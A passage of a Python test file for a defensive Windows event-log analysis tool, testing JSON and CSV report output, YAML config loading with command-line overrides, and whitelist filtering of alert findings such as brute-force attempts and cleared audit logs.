    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    # All three test findings have timestamps in their details.
    for finding in data["findings"]:
        assert finding["timestamp"] is not None
        assert finding["timestamp"].startswith("2026-04-07")


def test_json_report_maps_event_ids(tmp_path):
    """Each finding should have the correct event ID from RULE_EVENT_IDS."""
    output = tmp_path / "test.json"
    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    for finding in data["findings"]:
        expected = RULE_EVENT_IDS.get(finding["rule_name"])
        assert finding["event_id"] == expected


def test_json_report_mitre_field_is_null(tmp_path):
    """MITRE ATT&CK ID should be null for now (placeholder for future)."""
    output = tmp_path / "test.json"
    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    for finding in data["findings"]:
        assert finding["mitre_attack_id"] is None


def test_json_report_with_scan_stats(tmp_path):
    """When scan_stats is provided, metadata should include scan details."""
    output = tmp_path / "test.json"
    scan_stats = {
        "total_events": 5000,
        "files_scanned": 2,
        "earliest": "2026-04-06T08:00:00.000000Z",
        "latest": "2026-04-07T23:59:00.000000Z",
        "top_event_ids": [(4625, 3000), (4624, 1500)],
    }
    generate_report(
        _make_test_findings(), output_path=str(output), fmt="json", scan_stats=scan_stats
    )

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    meta = data["metadata"]
    assert meta["total_events"] == 5000
    assert meta["files_scanned"] == 2
    assert meta["time_range"]["earliest"] == "2026-04-06T08:00:00.000000Z"
    assert meta["top_event_ids"]["4625"] == 3000


def test_json_report_sorted_by_severity(tmp_path):
    """Findings should be sorted CRITICAL first, then HIGH, MEDIUM, LOW."""
    output = tmp_path / "test.json"
    generate_report(_make_test_findings(), output_path=str(output), fmt="json")

    with open(output, encoding="utf-8") as f:
        data = json.load(f)

    severities = [f["severity"] for f in data["findings"]]
    assert severities == ["CRITICAL", "HIGH", "MEDIUM"]


# ---------------------------------------------------------------------------
# CONFIG FILE TESTS
# ---------------------------------------------------------------------------
# These tests verify that pulse.yaml config loading works correctly,
# including fallback behavior when the file is missing or invalid.

from main import load_config, build_arg_parser


def test_load_config_returns_dict_from_yaml(tmp_path):
    """A valid YAML config file should return a dictionary."""
    config_file = tmp_path / "pulse.yaml"
    config_file.write_text("logs: my_logs\nformat: html\nseverity: HIGH\n")

    config = load_config(str(config_file))

    assert config["logs"] == "my_logs"
    assert config["format"] == "html"
    assert config["severity"] == "HIGH"


def test_load_config_returns_empty_dict_when_missing(tmp_path):
    """If the config file doesn't exist, return an empty dict (no crash)."""
    config = load_config(str(tmp_path / "nonexistent.yaml"))
    assert config == {}


def test_load_config_returns_empty_dict_on_invalid_yaml(tmp_path):
    """If the YAML file has a syntax error, warn and return empty dict."""
    config_file = tmp_path / "pulse.yaml"
    config_file.write_text("logs: [\ninvalid yaml here\n")

    config = load_config(str(config_file))
    assert config == {}


def test_load_config_handles_empty_file(tmp_path):
    """An empty YAML file should return an empty dict, not None."""
    config_file = tmp_path / "pulse.yaml"
    config_file.write_text("")

    config = load_config(str(config_file))
    assert config == {}


def test_config_overrides_argparse_defaults(tmp_path):
    """Config values should become the new defaults for argparse."""
    config = {"logs": "custom_logs", "format": "json", "severity": "HIGH"}
    parser = build_arg_parser(config)

    # Parse with no CLI args - should use config values.
    args = parser.parse_args([])

    assert args.logs == "custom_logs"
    assert args.format == "json"
    assert args.severity == "HIGH"


def test_cli_args_override_config():
    """CLI flags should always win over config values."""
    config = {"logs": "config_logs", "format": "html", "severity": "LOW"}
    parser = build_arg_parser(config)

    # Pass CLI flags that differ from config.
    args = parser.parse_args(["--logs", "cli_logs", "--format", "txt", "--severity", "CRITICAL"])

    assert args.logs == "cli_logs"
    assert args.format == "txt"
    assert args.severity == "CRITICAL"


def test_config_partial_values():
    """If config only sets some values, the rest use hardcoded defaults."""
    config = {"format": "html"}  # Only sets format, not logs or severity.
    parser = build_arg_parser(config)
    args = parser.parse_args([])

    assert args.format == "html"    # From config
    assert args.logs == "logs"      # Hardcoded default
    assert args.severity == "LOW"   # Hardcoded default
    assert args.output is None      # Hardcoded default


# ---------------------------------------------------------------------------
# WHITELIST TESTS
# ---------------------------------------------------------------------------
# These tests verify that the whitelist filter correctly suppresses
# known-good accounts, services, IPs, and rules from findings.

from main import filter_whitelist


def _make_whitelist_findings():
    """Helper that returns findings with various accounts, services, and IPs."""
    return [
        {
            "rule": "Brute Force Attempt",
            "severity": "HIGH",
            "details": "Account 'svc_backup' had 5+ failed login attempts within 10 minutes.",
        },
        {
            "rule": "Brute Force Attempt",
            "severity": "HIGH",
            "details": "Account 'admin' had 5+ failed login attempts within 10 minutes.",
        },
        {
            "rule": "RDP Logon Detected",
            "severity": "MEDIUM",
            "details": "Remote Desktop logon by 'jsmith' from IP 10.0.0.50.",
        },
        {
            "rule": "Suspicious Service Installed",
            "severity": "MEDIUM",
            "details": "New service 'CrowdStrike Falcon' was installed by 'SYSTEM'.",
        },
        {
            "rule": "Audit Log Cleared",
            "severity": "HIGH",
            "details": "Security event log was cleared at 2026-04-07T01:45:00.",
        },
    ]


def test_whitelist_suppresses_accounts():
    """Findings with whitelisted accounts should be removed."""
    whitelist = {"accounts": ["svc_backup"]}
    results = filter_whitelist(_make_whitelist_findings(), whitelist)

    # svc_backup finding removed, admin finding stays.
    assert len(results) == 4
    assert all("svc_backup" not in f["details"] for f in results)


def test_whitelist_suppresses_rules():
    """Findings with whitelisted rule names should be removed."""
    whitelist = {"rules": ["RDP Logon Detected"]}
    results = filter_whitelist(_make_whitelist_findings(), whitelist)

    assert len(results) == 4
    assert all(f["rule"] != "RDP Logon Detected" for f in results)


def test_whitelist_suppresses_services():
    """Findings with whitelisted service names should be removed."""
    whitelist = {"services": ["CrowdStrike Falcon"]}
    results = filter_whitelist(_make_whitelist_findings(), whitelist)

    assert len(results) == 4
    assert all("CrowdStrike" not in f["details"] for f in results)


def test_whitelist_suppresses_ips():
    """Findings with whitelisted IPs should be removed."""
    whitelist = {"ips": ["10.0.0.50"]}
    results = filter_whitelist(_make_whitelist_findings(), whitelist)

    assert len(results) == 4
    assert all("10.0.0.50" not in f["details"] for f in results)


def test_whitelist_multiple_categories():
    """Multiple whitelist categories should all apply at once."""
    whitelist = {
        "accounts": ["svc_backup"],
        "rules": ["RDP Logon Detected"],
        "services": ["CrowdStrike Falcon"],
    }
    results = filter_whitelist(_make_whitelist_findings(), whitelist)

    # 3 removed: svc_backup account, RDP rule, CrowdStrike service.
    assert len(results) == 2


def test_whitelist_is_case_insensitive():
    """Account and service matching should be case-insensitive."""
    whitelist = {"accounts": ["SVC_BACKUP"], "services": ["crowdstrike falcon"]}
    results = filter_whitelist(_make_whitelist_findings(), whitelist)

    # Both should be matched despite different casing.
    assert len(results) == 3


def test_whitelist_empty_does_nothing():
    """An empty whitelist should not remove any findings."""
    findings = _make_whitelist_findings()
    results = filter_whitelist(findings, {})
    assert len(results) == 5


def test_whitelist_none_does_nothing():
    """A None whitelist should not remove any findings."""
    findings = _make_whitelist_findings()
    results = filter_whitelist(findings, None)
    assert len(results) == 5


# ---------------------------------------------------------------------------
# CSV REPORT TESTS
# ---------------------------------------------------------------------------

import csv as csv_module


def test_csv_report_has_header_row(tmp_path):
    """CSV report must start with a header row."""
    output = tmp_path / "test.csv"
    generate_report(_make_test_findings(), output_path=str(output), fmt="csv")

    with open(output, encoding="utf-8") as f:
        reader = csv_module.reader(f)
        header = next(reader)

    assert header == ["Timestamp", "Event ID", "Severity", "Rule Name", "Description"]


def test_csv_report_has_correct_row_count(tmp_path):
    """CSV should have one row per finding plus the header."""
    output = tmp_path / "test.csv"
    findings = _make_test_findings()
    generate_report(findings, output_path=str(output), fmt="csv")

    with open(output, encoding="utf-8") as f:
        reader = csv_module.reader(f)
        rows = list(reader)

    # 1 header + 3 findings = 4 rows.
    assert len(rows) == 4


def test_csv_report_sorted_by_severity(tmp_path):
    """CSV findings should be sorted CRITICAL first."""
    output = tmp_path / "test.csv"
    generate_report(_make_test_findings(), output_path=str(output), fmt="csv")

    with open(output, encoding="utf-8") as f:
        reader = csv_module.reader(f)
        next(reader)  # skip header
        severities = [row[2] for row in reader]

    assert severities == ["CRITICAL", "HIGH", "MEDIUM"]


def test_csv_report_opens_as_valid_csv(tmp_path):
    """The CSV file must be parseable without errors."""
    output = tmp_path / "test.csv"
    generate_report(_make_test_findings(), output_path=str(output), fmt="csv")

    with open(output, encoding="utf-8") as f:
        reader = csv_module.reader(f)
        rows = list(reader)  # Will raise if CSV is malformed

    assert len(rows) > 0
